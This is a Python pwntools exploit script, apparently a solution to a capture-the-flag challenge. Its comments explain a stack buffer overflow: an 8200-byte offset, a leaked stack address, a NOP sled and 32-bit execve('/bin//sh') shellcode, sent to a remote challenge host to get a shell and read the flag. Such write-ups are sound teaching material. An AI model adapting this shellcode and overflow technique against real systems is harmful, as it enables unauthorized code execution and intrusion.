#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When running this binary, it states that there isn't a win function, yet the stack
# is executable. This makes me believe I am going to want to execute shellcode that
# pops a shell. It also gives a random stack address, which I believe I am going
# to want to extract and then jump to.

# After displaying this info, it then gives me a buffer in which I can write into.
# To determine the offset from the start of this buffer to the return address, I
# used the command 'python3 -c "print('a' * 8200)" | challenges/./shellz' to run
# the binary with different amounts of input. From trial and error, I was able to
# determine that passing in 8200 bytes caused an overflow, yet anything less did not.
# NOTE: whilst normally I would use cyclic 8200 in gdb, for very large values copying
# input doesn't seem to work, so use piping when the offset is large.

# Hence, my plan is to overflow the buffer with 8200 bytes until I reach the EIP
# register which contains the return address, at which point I can point it to
# the random stack address. Now whilst it would be ideal to place my shellcode at
# this address exactly, this is too difficult. 

# What I can do however, is place a NOP sled in my overflow so that if this random 
# address happens to be overwritten by a NOP instruction, it will keep executing them
# until it reaches the shellcode which I place after the NOP sled.

# The script:

p = remote("plsdonthaq.me", 3002)

# First we extract the 'random stack address' which we want to return to
p.recvuntil("random stack address: ")
randomStack = int(p.recvline()[:-1], 0)

# Here is the shellcode to pop a shell. It first sets eax to 0 and pushes it to the
# stack, and then pushes the string "/bin//sh". After this, we move the arguments
# into their registers, and then move the value for execve into the lower 8 bits
# of eax, and then call it using int 0x80.
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Here we send our payload for the buffer overflow. We use the filler parameter to
# input our NOP sled. Since our return address is at an offest of 8200 bytes, this is
# the offset that we place the stack address we want to jump to.

# We also want to include our shellcode in this payload. As for the offset to place
# it, we want it as late in the payload as possible to maximise the chance we land
# on the NOP sled preceding it. Hence, we determine it is 23 bytes long using
# log.info(len(shellcode)), and then add an extra 8 bytes of buffer between the
# shellcode and return address, giving us 8200 - 8 - 23 = 8169.
p.sendline(flat({
  8169: shellcode,
  8200: p32(randomStack)
  }, filler=b"\x90"))

# Now we should have shell access, and can use 'cat flag' to view the flag
p.interactive()
